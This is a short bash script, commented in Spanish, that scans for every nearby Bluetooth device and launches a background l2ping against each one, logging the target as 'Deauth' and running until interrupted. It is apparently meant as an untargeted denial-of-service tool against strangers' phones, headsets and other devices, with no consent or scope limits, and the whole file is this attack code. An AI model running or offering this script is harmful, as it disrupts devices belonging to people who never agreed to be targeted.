#!/bin/bash

# Función para manejar la terminación del script
cleanup() {
  echo "Deteniendo l2ping..."
  kill "$(jobs -p)" 2>/dev/null
  wait
  echo "Script terminado."
  exit 0
}

# Captura de señales
trap cleanup SIGINT SIGTERM

# Valor por defecto para la interfaz
INTERFACE="hci0"

# Procesar argumentos
while getopts "i:" opt; do
  case $opt in
  i)
    INTERFACE=$OPTARG
    ;;
  *)
    echo "Uso: $0 [-i INTERFACE]"
    exit 1
    ;;
  esac
done

# Activar la interfaz Bluetooth
hciconfig "$INTERFACE" up

# Escanear dispositivos Bluetooth
echo "[+] Scanning Bluetooth devices..."
SCAN_OUTPUT=$(hcitool scan)

# Parsear la salida para obtener direcciones MAC y nombres
echo "$SCAN_OUTPUT" | while read -r line; do

  # Ignorar la línea de encabezado y la línea "Scanning ..."
  if [[ "$line" == "Scanning ..." ]] || [[ -z "$line" ]]; then
    continue
  fi

  read -r MAC_ADDR DEVICE_NAME <<<"$line"

  echo "[+] Deauth $DEVICE_NAME: $MAC_ADDR"
  l2ping "$MAC_ADDR" &
done

# Mantener el script en ejecución hasta que se detenga manualmente
echo "[+] Todos los pings están en ejecución. Presiona CTRL+C para detener."

# Bucle infinito para mantener el script activo
while true; do
  sleep 1
done
